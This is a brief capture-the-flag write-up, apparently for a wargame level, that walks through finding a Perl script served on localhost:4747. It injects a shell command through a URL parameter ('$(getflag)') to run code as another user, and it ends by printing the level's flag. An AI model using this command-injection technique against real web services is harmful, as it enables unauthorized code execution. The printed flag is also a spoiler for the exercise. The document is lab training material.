# level04

We got some intel from level00:
dr-xr-x---  2 flag04 level04  33 Mar 12  2016 level04
/var/www/level04
/rofs/var/www/level04

```shell
cat level04.pl
```

seems to indicate that a server is running on localhost:4747

```shell
service apache2 status
```

tells us that a webserver is probably running too

```shell
ls /var/www/level04
```

shows the same level04.pl script as ~/level04.pl

```shell
/etc/apache2/sites-enabled$ cat level05.conf
```

shows that the root of the webserv is containing level04.pl

```shell
curl localhost:4747?x=exploit
```

returns `exploit` meaning that we might inject some code

```shell
cat /etc/apache2/sites-enabled/level05.conf
```

shows that this code would be executed belonging to flag04 group

```shell
curl localhost:4747?x='$(getflag)'
```

gives flag:

```shell
ne2searoevaevoem4ov4ar8ap
```
